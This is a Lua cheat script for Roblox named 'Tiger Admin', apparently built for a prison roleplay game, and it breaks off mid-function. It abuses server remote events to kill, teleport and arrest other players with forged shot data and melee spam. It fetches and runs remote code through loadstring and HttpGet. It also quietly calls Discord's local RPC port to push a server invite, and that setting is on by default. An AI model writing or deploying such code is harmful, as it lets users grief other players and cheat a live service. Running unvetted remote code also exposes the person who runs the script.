--[[
Forged by h17s3
]]

if not getconnections or not hookmetamethod or not getnamecallmethod or not ((getgenv and getgenv()) or _G) then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Tiger Admin",Text = "Executor is not supported!",Duration = 10,})
end
if not workspace:FindFirstChild("Criminals Spawn") or not workspace:FindFirstChild("Criminals Spawn"):FindFirstChild("SpawnLocation") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Tiger Admin",Text = "Criminals spawn not found! Please rejoin.",Duration = 10,})
end
game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
if game:FindFirstChild("Tiger_revamp_loaded") then  ((getgenv and getgenv()) or _G).NotifTiger("Tiger admin is already executed!",false) return warn("Already loaded") end
local Player, plr,Folder = game:GetService("Players").LocalPlayer, game:GetService("Players").LocalPlayer,Instance.new("Folder",game)
local OldHook, hookmetamethod, getnamecallmethod = nil, hookmetamethod, getnamecallmethod
local HasGamepass,UserInputService = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(Player.UserId, 96651),game:GetService("UserInputService")
local GlobalVar = ((getgenv and getgenv()) or _G)
local Unloaded = false
local CriminalCFRAME = workspace["Criminals Spawn"].SpawnLocation.CFrame
local API_Prem = loadstring(game:HttpGet("https://raw.githubusercontent.com/dalloc2/Roblox/main/Listing.lua"))()
local PremiumActivated = API_Prem.CheckPremium()

local Temp = {}
local API = {}
local Reload_Guns = {}
local Prefix = "!"

--------
Folder.Name = "Tiger_revamp_loaded"
ScreenGui = Instance.new("ScreenGui")
CmdBarFrame = Instance.new("Frame")
UICorner = Instance.new("UICorner")
Out = Instance.new("ImageLabel")
UICorner_2 = Instance.new("UICorner")
CommandBar = Instance.new("TextBox")
UIStroke = Instance.new("UIStroke")
Commands = Instance.new("ImageLabel")
UICorner_3 = Instance.new("UICorner")
UIStroke_2 = Instance.new("UIStroke")
CommandsList = Instance.new("ScrollingFrame")
UIListLayout = Instance.new("UIListLayout")
TEMP_CMD = Instance.new("TextLabel")
SearchBar = Instance.new("TextBox")
ScreenGui.Parent = (game:GetService("CoreGui") or gethui())
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Name = math.random()

CmdBarFrame.Name = "CmdBarFrame"
CmdBarFrame.Parent = ScreenGui
CmdBarFrame.AnchorPoint = Vector2.new(0.5, 0.5)
CmdBarFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CmdBarFrame.BackgroundTransparency = 1.000
CmdBarFrame.BorderSizePixel = 0
CmdBarFrame.Position = UDim2.new(0.5, 0, 0.899999998, 0)
CmdBarFrame.Position = CmdBarFrame.Position+UDim2.new(0,0,1.1,0)
CmdBarFrame.Size = UDim2.new(0, 577, 0, 65)

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = CmdBarFrame
Temp.Esps = {}
do
	CmdsIcon = Instance.new("ImageLabel")
	UICornera = Instance.new("UICorner")
	UIStroke12 = Instance.new("UIStroke")
	CmdButton = Instance.new("ImageButton")

	CmdsIcon.Name = "CmdsIcon"
	CmdsIcon.Parent = CmdBarFrame
	CmdsIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	CmdsIcon.Position = UDim2.new(-0.132423401, 0, 0.0226149559, 0)
	CmdsIcon.Size = UDim2.new(0.121672593, 0, 0.945454538, 0)
	CmdsIcon.Image = "rbxassetid://12661800163"
	CmdsIcon.ImageTransparency = 0.030

	UICornera.CornerRadius = UDim.new(0, 6)
	UICornera.Parent = CmdsIcon

	UIStroke12.Parent = CmdsIcon

	CmdButton.Name = "CmdButton"
	CmdButton.Parent = CmdsIcon
	CmdButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdButton.BackgroundTransparency = 1.000
	CmdButton.Position = UDim2.new(0.298999995, 0, 0.27700001, 0)
	CmdButton.Size = UDim2.new(0, 27, 0, 27)
	CmdButton.Image = "rbxassetid://11570802781"
	CmdButton.ImageTransparency = 0.430
	CmdButton.MouseButton1Up:Connect(function()
		if not Temp.CmdsC then
			Temp.CmdsC = true
			if Commands.Visible == false then
				Commands:TweenPosition(SavedCmdsPosition,"Out","Quart",1)
				Commands.Visible = true
			else
				Commands:TweenPosition(SavedCmdsPosition+UDim2.new(0,0,1,0),"Out","Quart",1)
				wait(.5)
				Commands.Visible = false
			end
			wait(.7)
			Temp.CmdsC = false
		end
	end)
	CmdButton.MouseEnter:Connect(function()
		CmdButton.ImageColor3 = Color3.new(0.588235, 0.588235, 0.588235)
	end)
	CmdButton.MouseLeave:Connect(function()
		CmdButton.ImageColor3 = Color3.new(1, 1, 1)
	end)
end
do
	Toggles = Instance.new("ImageLabel")
	local Stokeee = Instance.new("UIStroke")
	local Corrrer = Instance.new("UICorner")
	local ToggleScroll = Instance.new("ScrollingFrame")
	local kewkfwe = Instance.new("UIListLayout")
	local tempb = Instance.new("TextButton")
	local UIStroke = Instance.new("UIStroke")
	local UICorner = Instance.new("UICorner")

	Toggles.Name = "Toggles"
	Toggles.Parent = ScreenGui
	Toggles.AnchorPoint = Vector2.new(0.5, 0.5)
	Toggles.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Toggles.Position = UDim2.new(0.499593854, 0, 0.499376595, 0)+UDim2.new(0,0,1,0)
	Toggles.Size = UDim2.new(0, 539, 0, 409)
	Toggles.Visible = false
	Toggles.Image = "rbxassetid://12011977394"
	Toggles.ImageTransparency = 0.260

	Stokeee.Parent = Toggles
	Stokeee.Name = "Stokeee"

	Corrrer.Name = "Corrrer"
	Corrrer.Parent = Toggles

	ToggleScroll.Name = "ToggleScroll"
	ToggleScroll.Parent = Toggles
	ToggleScroll.Active = true
	ToggleScroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ToggleScroll.BackgroundTransparency = 1.000
	ToggleScroll.Size = UDim2.new(0, 539, 0, 408)
	ToggleScroll.ScrollBarThickness = 4

	kewkfwe.Name = "kewkfwe"
	kewkfwe.Parent = ToggleScroll
	kewkfwe.SortOrder = Enum.SortOrder.LayoutOrder
	kewkfwe.Padding = UDim.new(0, 5)

	tempb.Name = "tempb"
	tempb.Parent = ScreenGui
	tempb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	tempb.BackgroundTransparency = 0.550
	tempb.Position = UDim2.new(0, 0, -7.47979882e-08, 0)
	tempb.Size = UDim2.new(0, 539, 0, 44)
	tempb.Visible = false
	tempb.Font = Enum.Font.SourceSans
	tempb.Text = "Autorespawn [OFF]"
	tempb.TextColor3 = Color3.fromRGB(255, 255, 255)
	tempb.TextSize = 14.000

	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Parent = tempb

	UICorner.CornerRadius = UDim.new(0, 3)
	UICorner.Parent = tempb

end

Out.Name = "Out"
Out.Parent = CmdBarFrame
Out.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Out.Position = UDim2.new(0.0200897697, 0, 0.022615375, 0)
Out.Size = UDim2.new(0.974358976, 0, 0.945454538, 0)
Out.Image = "rbxassetid://11789397066"
Out.ImageTransparency = 0.240

UICorner_2.CornerRadius = UDim.new(0, 6)
UICorner_2.Parent = Out

CommandBar.Name = "CommandBar"
CommandBar.Parent = Out
CommandBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.BackgroundTransparency = 1.000
CommandBar.BorderSizePixel = 0
CommandBar.Position = UDim2.new(0.0359953903, 0, 0.128254473, 0)
CommandBar.Size = UDim2.new(0, 519, 0, 46)
CommandBar.Font = Enum.Font.SourceSans
CommandBar.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
CommandBar.PlaceholderText = "Command bar"
CommandBar.Text = ""
CommandBar.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.TextSize = 24.000
CommandBar.TextTransparency = 0.140
CommandBar.TextWrapped = true

UIStroke.Parent = Out

Commands.Name = "Commands"
Commands.Parent = ScreenGui
Commands.AnchorPoint = Vector2.new(0.5, 0.5)
Commands.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Commands.Position = UDim2.new(0.5, 0, 0.5, 0)
Commands.Size = UDim2.new(0, 455, 0, 297)
Commands.Image = "rbxassetid://12011977394"
Commands.ImageTransparency = 0.200
Commands.Visible = false

UICorner_3.CornerRadius = UDim.new(0, 6)
UICorner_3.Parent = Commands

UIStroke_2.Parent = Commands

CommandsList.Parent = Commands
CommandsList.Active = true
CommandsList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommandsList.BackgroundTransparency = 1.000
CommandsList.Position = UDim2.new(0, 0, 0.077441074, 0)
CommandsList.Size = UDim2.new(0, 455, 0, 274)
CommandsList.ScrollBarThickness = 5
CommandsList.AutomaticCanvasSize="Y"
UIListLayout.Parent = CommandsList
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 8)

TEMP_CMD.Parent = Folder
TEMP_CMD.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
TEMP_CMD.BackgroundTransparency = 0.750
TEMP_CMD.Size = UDim2.new(0, 455, 0, 14)
TEMP_CMD.Font = Enum.Font.SourceSans
TEMP_CMD.Text = "sex"--//yes
TEMP_CMD.TextColor3 = Color3.fromRGB(255, 255, 255)
TEMP_CMD.TextSize = 14.000
SavedCmdsPosition = Commands.Position
SearchBar.Parent = Commands
SearchBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SearchBar.BackgroundTransparency = 1.000
SearchBar.Size = UDim2.new(0, 455, 0, 17)
SearchBar.Font = Enum.Font.SourceSans
SearchBar.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
SearchBar.PlaceholderText = "Search here"
SearchBar.Text = ""
SearchBar.TextColor3 = Color3.fromRGB(234, 234, 234)
SearchBar.TextSize = 14.000

Folder.Parent = game

do
	--Load guis
	game:GetService("ContentProvider"):PreloadAsync({
		Commands,
		Out,
	})
end

for i,v in pairs(ScreenGui:GetDescendants()) do v.Name = game:GetService("HttpService"):GenerateGUID(true) end
local AmmountCurrent = 0
local commandsLol = {}
function API:CreateCmd(Header, Description, Callback,IsHide,Extra,IsPre,plsdonotlower)
	local CloneTXT = TEMP_CMD:Clone()
	CloneTXT.Text = Prefix..Header.." "..(Extra or "").." | "..Description
	if IsHide then
		CloneTXT.Parent =nil
	else
		CloneTXT.Parent = CommandsList
	end
	if IsPre then
		CloneTXT.TextColor3 = Color3.new(1, 0.796078, 0.0666667)
	end
	AmmountCurrent=AmmountCurrent+1
    commandsLol[Header] = Callback
	local function FactCheck(TheText)
		if Unloaded then return end
		local Text = nil
		if not plsdonotlower then
			Text=TheText:lower()
		else
			Text = TheText
		end
		local Split = Text:split(" ")
		local First = Split[1]
		local Second = Split[2]

		if First:lower() == Header:lower() or First:lower() == Prefix..Header:lower() then
			local a,b = pcall(function()
				Callback(Split)
			end)
			if not a and b then
				warn("--> TIGER ADMIN DETECTED AN ERROR")
				warn("COMMAND: "..Prefix..Header)
				warn("ERROR: "..tostring(b))
			end
		end
	end
	Player.Chatted:Connect(function(c)
		if c and not Unloaded then
			local Subbed = string.sub(c,1,1)
			if Subbed == Prefix then
				FactCheck(c)
			end
		end
	end)
	CommandBar.FocusLost:Connect(function(EnterKey)
		if EnterKey and not Unloaded then
			FactCheck(CommandBar.Text)
			task.wait(.04)
			CommandBar.Text = ""
		end
	end)
end

function API:Tween(Obj, Prop, New, Time)
	if not Time then
		Time = .5
	end
	local TweenService = game:GetService("TweenService")
	local info = TweenInfo.new(
		Time, 
		Enum.EasingStyle.Quart, 
		Enum.EasingDirection.Out, 
		0, 
		false,
		0
	)
	local propertyTable = {
		[Prop] = New,
	}

	TweenService:Create(Obj, info, propertyTable):Play()
end
function API:Notif(Text,Dur)
	task.spawn(function()
		if not Dur then
			Dur = 1.5
		end
		local Notif = Instance.new("ScreenGui")
		local Frame_1 = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")
		Notif.Parent = (game:GetService("CoreGui") or gethui())
		Notif.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		Frame_1.Parent = Notif
		Frame_1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame_1.BackgroundTransparency=1
		Frame_1.BorderSizePixel = 0
		Frame_1.Position = UDim2.new(0, 0, 0.0500000007, 0)
		Frame_1.Size = UDim2.new(1, 0, 0.100000001, 0)
		TextLabel.Parent = Frame_1
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.TextTransparency =1
		TextLabel.Size = UDim2.new(1, 0, 1, 0)
		TextLabel.Font = Enum.Font.Highway
		TextLabel.Text = Text or "Text not found"
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 21.000
		API:Tween(Frame_1,"BackgroundTransparency",0.350,.5)
		API:Tween(TextLabel,"TextTransparency",0,.5)
		wait(Dur+.7)
		API:Tween(Frame_1,"BackgroundTransparency",1,.5)
		API:Tween(TextLabel,"TextTransparency",1,.5)
		wait(.7)
		Notif:Destroy()
	end)
	return
end
GlobalVar.NotifTiger = function(t,v)
	API:Notif(t,v)
end
local States = {}
local Settings = {
	Prefix = "!",
	ValidCommands = {},
}
local OrginMenuPos = Player.PlayerGui.Home.hud.MenuButton.Position
local OrginGunPos = Player.PlayerGui.Home.hud.GunFrame.Position
do
	States.loopkillinmates = false
	States.loopkillcriminals = false
	States.DraggableGuis = false
	States.spawnguns = false
	States.loopkillguards = false
	States.Antishield = false
	States.DoorsDestroy = false
	States.antipunch = false
	States.AutoRespawn = true
	States.AutoItems = false
	States.ClickKill = false
	States.ClickArrest = false
	States.AntiTase = false
	States.AntiArrest = false
	States.OnePunch = false
	States.killaura = false
	States.anticrash = false
	States.AntiTouch = false
	States.ShootBack = false
	States.AntiFling = false
	States.AutoInfAmmo = false
	States.joinlogs = false
	States.noclip = false
	States.Godmode = false
	States.loopopendoors = false
	States.SilentAim = false
	States.ArrestAura = false
	States.OneShot = false
	States.ff = false
	States.esp = false
	States.earrape = false
	--
	Temp.IsBringing = false
	Temp.Loopkilling = {}
	Temp.ArrestOldP = false
	Temp.KillAuras = {}
	API.Whitelisted = {}
	Temp.Admins = {}
	Temp.LoopmKilling = {}
	Temp.Viruses = {}
	Temp.SavedAdmins = {}
	Running = false
end

if writefile and makefolder and readfile and isfile then
	if isfile("Tiger Admin") == false or isfile("Tiger_Admin/Invite.json") == false then
		makefolder("Tiger_Admin")
		if isfile("Tiger_Admin/Invite.json") == false then
			writefile("Tiger_Admin/Invite.json",game:GetService("HttpService"):JSONEncode({
				Invite_To_Server = true
			}))
		end
		if isfile("Tiger_Admin/SavedAdmins.json") == false then
			writefile("Tiger_Admin/SavedAdmins.json",game:GetService("HttpService"):JSONEncode({}))
		else
			local Content = game:GetService("HttpService"):JSONDecode(readfile("Tiger_Admin/SavedAdmins.json"))
			for i,v in pairs(Content) do
				if v then
					table.insert(Temp.Admins, v)
				end
			end
		end
	end
end

task.spawn(function()
	if writefile and makefolder and readfile and isfile then
		if game:GetService("HttpService"):JSONDecode(readfile("Tiger_Admin/Invite.json")).Invite_To_Server then
			local Request_ = (syn and syn.request) or http_request or request
			Request_({
				Url = 'http://127.0.0.1:6463/rpc?v=1',
				Method = 'POST',
				Headers = {
					['Content-Type'] = 'application/json',
					Origin = 'https://discord.com'
				},
				Body = game:GetService("HttpService"):JSONEncode({
					cmd = 'INVITE_BROWSER',
					nonce = game:GetService("HttpService"):GenerateGUID(false),
					args = {code = 'zj5xRp3ZKn'}
				})
			})
		end
	end
end)

function API:CreateBulletTable(Amount, Hit, IsTrue)
	local Args = {}
	for i = 1, tonumber(Amount) do
		if IsTrue then
			Args[#Args + 1] = {
				["RayObject"] = Ray.new(Vector3.new(990.272583, 101.489975, 2362.74878), Vector3.new(-799.978333, 0.23157759, -5.88794518)),
				["Distance"] = 198.9905242919922,
				["Cframe"] = CFrame.new(894.362549, 101.288307, 2362.53491, -0.0123058055, 0.00259522465, -0.999920964, 3.63797837e-12, 0.999996722, 0.00259542116, 0.999924302, 3.19387436e-05, -0.0123057645),
			}
		else
			Args[#Args + 1] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
				["Distance"] = 0,
				["Cframe"] = CFrame.new(),
				["Hit"] = Hit,
			}
		end
	end
	return Args
end
function DragifyGui(Frame,Is)
	coroutine.wrap(function()
		local dragToggle = nil
		local dragSpeed = 0.50
		local dragInput = nil
		local dragStart = nil
		local dragPos = nil
		local startPos = nil
		local function updateInput(input)
			if not Is then
				if not States.DraggableGuis then
					return
				end
			end
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if not Is then
				if States.DraggableGuis then
					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and game:GetService("UserInputService"):GetFocusedTextBox() == nil then
						dragToggle = true
						dragStart = input.Position
						startPos = Frame.Position
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragToggle = false
							end
						end)
					end
				end
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if States.DraggableGuis then
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if States.DraggableGuis then
				if input == dragInput and dragToggle then
					updateInput(input)
				end
			end
		end)
	end)()
end
DragifyGui(Out)
DragifyGui(Commands)
DragifyGui(CmdsIcon)
local IsBringing = false
function API:swait()
	game:GetService("RunService").Stepped:Wait()
end
function API:bring(Target,TeleportTo,MoreTP,DontBreakCar)
	local BringingFromAdmin = nil
	if table.find(Temp.Admins,Target.Name) then
		BringingFromAdmin = true
	end
	if not IsBringing and Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>0 and Target.Character:FindFirstChildOfClass("Humanoid").Sit == false then
		if not TeleportTo then
			TeleportTo = API:GetPosition()
		end
		local Orgin = API:GetPosition()
		local CarPad = workspace.Prison_ITEMS.buttons["Car Spawner"]
		local car = nil
		local Seat = nil
		local Failed = false
		local CheckForBreak = function()
			if not Target or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health<1 or Player.Character:FindFirstChildOfClass("Humanoid").Health<1 then
				Failed = true
				return true
			else
				return nil
			end
		end

		for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
			if v then
				if v:WaitForChild("Body"):WaitForChild("VehicleSeat").Occupant == nil then
					car = v
				end
			end
		end
		if not car then
			coroutine.wrap(function()
				if not car then
					car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
				end
			end)()
			repeat wait()
				game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-524, 55, 1777))
				task.spawn(function()
					workspace.Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[7]["Car Spawner"])
				end)
				if CheckForBreak() then
					break
				end
			until car
		end
		car:WaitForChild("Body"):WaitForChild("VehicleSeat")
		car.PrimaryPart = car.Body.VehicleSeat
		Seat = car.Body.VehicleSeat
		repeat wait()
			Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
		until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
		wait() --// so it doesnt break
		repeat API:swait()
			if CheckForBreak() or not Player.Character:FindFirstChildOfClass("Humanoid") or Player.Character:FindFirstChildOfClass("Humanoid").Sit == false then
				break
			end
			car.PrimaryPart = car.Body.VehicleSeat
			if Target.Character:FindFirstChildOfClass("Humanoid").MoveDirection.Magnitude >0 then
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-6))
			else
				car:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,-.2,-5))
			end
		until Target.Character:FindFirstChildOfClass("Humanoid").Sit == true
		if Failed then
			API:Notif("Failed to bring the player!")
			if BringingFromAdmin then
				local ohString1 = "/w "..Target.Name.." ".."ADMIN: Bring has failed! Try again later."
				local ohString2 = "All"
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
			end
			return
		end
		for i =1,10 do
			car:SetPrimaryPartCFrame(TeleportTo)
			API:swait()
		end
		wait(.1)
		task.spawn(function()
			if PremiumActivated and not DontBreakCar then
				repeat task.wait() until Target.Character:FindFirstChildOfClass("Humanoid").Sit == false
				repeat wait()
					Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
				until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
				for i =1,10 do
					car:SetPrimaryPartCFrame(CFrame.new(0,workspace.FallenPartsDestroyHeight+10,0))
					API:swait()
				end
				API:UnSit()
				API:MoveTo(Orgin)
			end
		end)
		if not PremiumActivated then
			API:UnSit()
			API:MoveTo(Orgin)
		end
	else
		if BringingFromAdmin then
			local ohString1 = "/w "..Target.Name.." ".."ADMIN: Bring has failed! Try again later."
			local ohString2 = "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)

		end
		API:Notif("Player has died or is sitting or an unknown error.")
	end
end

function API:FindPlayer(String,IgnoreError)
	String = String:gsub("%s+", "")
	for _, v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Name:lower():match("^" .. String:lower()) or v.DisplayName:lower():match("^" .. String:lower()) then
			return v
		end
	end
	if not IgnoreError then
		API:Notif("Player has left or is not in your current game.",false)
	end
	return nil
end
function API:ConvertPosition(Position)
	if typeof(Position):lower() == "position" then
		return CFrame.new(Position)
	else
		return Position
	end
end

function API:GetPart(Target)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	return Target.Character:FindFirstChild("HumanoidRootPart") or Target.Character:FindFirstChild("Head")
end
function API:GetPosition(Player)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	if Player then
		return API:GetPart(Player).CFrame
	elseif not Player then
		return API:GetPart(plr).CFrame
	end
end
function API:GetCameraPosition(Player)
	return workspace["CurrentCamera"].CFrame
end
function API:Loop(Times, calling)
	for i = 1, tonumber(Times) do
		calling()
	end
end
function PublicOutput(CODE)
	local Args ={
		{
			RayObject = Ray.new(),
			Distance = 0,
			Cframe = CFrame.new(1,1,20000),
			MSG = CODE,
			PLA = Player.UserId
		}
	}
	repeat task.wait() API:GetGun("M9") until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
	local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
	coroutine.wrap(function()
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Args, Gun)
	end)()
	coroutine.wrap(function()
		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
	end)()
end
function API:MoveTo(Cframe)
	Cframe = API:ConvertPosition(Cframe)
	local Amount = 5
	if Player.PlayerGui['Home']['hud']['Topbar']['titleBar'].Title.Text:lower() == "lights out" or Player.PlayerGui.Home.hud.Topbar.titleBar.Title.Text:lower() == "lightsout" then
		Amount = 11
	end
	for i = 1, Amount do
		API:UnSit()
		Player.Character:WaitForChild("HumanoidRootPart").CFrame = Cframe
		API:swait()
	end
end
function API:WaitForRespawn(Cframe,NoForce)
	game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

	local Cframe = API:ConvertPosition(Cframe)
	local CameraCframe = API:GetCameraPosition()
	coroutine.wrap(function()
		local a
		a = Player.CharacterAdded:Connect(function(NewCharacter)
			pcall(function()
				coroutine.wrap(function()
					workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
					API:Loop(5, function()
						workspace["CurrentCamera"].CFrame = CameraCframe
					end)
				end)()
				NewCharacter:WaitForChild("HumanoidRootPart")
				API:MoveTo(Cframe)
				if NoForce then
					task.spawn(function()
						NewCharacter:WaitForChild("ForceField"):Destroy()
					end)
				end
			end)
			a:Disconnect()
			Cframe = nil
		end)
		task.spawn(function()
			wait(2)
			if a then
				a:Disconnect()
			end
		end)
	end)()
end
function API:ChangeTeam(TeamPath,NoForce,Pos)
	pcall(function()
		repeat task.wait() until game:GetService("Players").LocalPlayer.Character
		game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")

		API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
	end)
	if TeamPath == game.Teams.Criminals then
		task.spawn(function()
			workspace.Remote.TeamEvent:FireServer("Bright orange")
		end)
		repeat API:swait() until Player.Team == game.Teams.Inmates and Player.Character:FindFirstChild("HumanoidRootPart")
		repeat
			API:swait()
			if firetouchinterest then
				firetouchinterest(plr.Character:FindFirstChildOfClass("Part"), game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1], 0)
				firetouchinterest(plr.Character:FindFirstChildOfClass("Part"), game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1], 1)
			end
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].Transparency = 1
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CanCollide = false
			game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CFrame = API:GetPosition()
		until plr.Team == game:GetService("Teams").Criminals
		game:GetService("Workspace")["Criminals Spawn"]:GetChildren()[1].CFrame = CFrame.new(0, 3125, 0)
	else
		if TeamPath == game.Teams.Neutral then
			workspace['Remote']['TeamEvent']:FireServer("Bright orange")
		else
			if not TeamPath or not TeamPath.TeamColor then
				workspace['Remote']['TeamEvent']:FireServer("Bright orange")
			else
				workspace['Remote']['TeamEvent']:FireServer(TeamPath.TeamColor.Name)
			end
		end
	end
end
function API:FindString(String,Table)
	String = String:gsub("%s+", "")
	for m, n in pairs(Table) do
		if n:lower():match("^" .. String:lower()) then
			return n
		end
	end
	return nil
end
function API:Refresh(NoForce,Position)
	API:ChangeTeam(plr.Team,NoForce,Position)
end
function API:UnSit()
	game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
end
function API:KillPlayer(Target,Failed,DoChange)
	local Bullets = API:CreateBulletTable(20,(Target.Character:FindFirstChild("Head") or Target.Character:FindFirstChildOfClass("Part")))
	if not Target or not Target.Character or not Target.Character:FindFirstChildOfClass("Humanoid") or Target.Character:FindFirstChildOfClass("Humanoid").Health <1 then
		return
	end
	repeat API:swait() until not Target.Character:FindFirstChildOfClass("ForceField")
	local CurrentTeam = nil
	if Target.Team == Player.Team then
		if Target.Team~= game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Criminals,true)
		elseif Target.Team == game.Teams.Criminals then
			CurrentTeam = Player.Team
			API:ChangeTeam(game.Teams.Inmates,true)
		end
	end

	local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
	API:GetGun("Remington 870")
	repeat API:swait()Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun
	task.spawn(function()
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
	end)
	coroutine.wrap(function()
		wait(.7)
		pcall(function()
			if Target.Character:FindFirstChildOfClass("Humanoid").Health >1 and not Failed then
				API:KillPlayer(Target,true)
			end
		end)
	end)()
	if CurrentTeam and not Player.Team == CurrentTeam and not DoChange then
		wait(.3)
		API:ChangeTeam(CurrentTeam,true)
	end
end
function API:GetGun(Item, Ignore)
	task.spawn(function()
		workspace:FindFirstChild("Remote")['ItemHandler']:InvokeServer({
			Position = Player.Character.Head.Position,
			Parent = workspace.Prison_ITEMS:FindFirstChild(Item, true)
		})
	end)
end
function API:CreateKillPart()
	if Temp.KillPart then
		pcall(function()
			Temp.KillPart:Destroy()
		end)
		Temp.KillPart = nil
	end
	local Part = Instance.new("Part",plr.Character)
	local hilight = Instance.new("Highlight",Part)
	hilight.FillTransparency = 1

	Part.Anchored = true
	Part.CanCollide = false
	Part.CanTouch = false
	Part.Material = Enum.Material.SmoothPlastic
	Part.Transparency = .98
	Part.Material = Enum.Material.SmoothPlastic
	Part.BrickColor = BrickColor.White()
	Part.Size = Vector3.new(20,2,20)
	Part.Name = "KillAura"
	Temp.KillPart = Part
end
function API:MKILL(target,STOP,P)
	if target == plr or target == plr.Name then
		return
	end
	if typeof(target):lower() == "string" and game:GetService("Players"):FindFirstChild(target) then
		target = game:GetService("Players"):FindFirstChild(target)
	end
	if not STOP then STOP =1 end
	if not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChildOfClass("ForceField") or target.Character:FindFirstChild("Humanoid").Health<1 or not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid") or not plr.Character:FindFirstChild("HumanoidRootPart")  then
		return
	end
	API:UnSit()
	local saved = API:GetPosition()
	if not P then P = saved else saved = P end
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character:FindFirstChild("Head").CFrame
	wait(.2)
	for i =1,10 do
		task.spawn(function()
			game.ReplicatedStorage["meleeEvent"]:FireServer(target)
		end)
	end
	wait(.1)
	if target and target.Character and target.Character:FindFirstChild("Humanoid") and target.Character:FindFirstChild("Humanoid").Health >1 and STOP ~=3 then
		API:MKILL(target,STOP+1,P)
		return
	end
	API:MoveTo(saved)
end
function API:killall(TeamToKill)
	if not TeamToKill then
		local LastTeam = Player.Team
		local BulletTable = {}
		if Player.Team ~= game.Teams.Criminals then
